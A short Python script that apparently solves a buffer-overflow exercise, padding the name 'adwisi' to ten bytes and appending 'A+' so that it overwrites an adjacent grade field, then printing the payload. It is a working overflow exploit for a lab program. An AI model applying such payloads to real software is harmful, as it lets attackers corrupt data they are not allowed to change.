#!/usr/bin/env python3

import sys


adwisi = b'adwisi'
pad = 10 - len(adwisi)
grade = b'A+'

payload = adwisi + b'A' * pad + grade

sys.stdout.buffer.write(payload)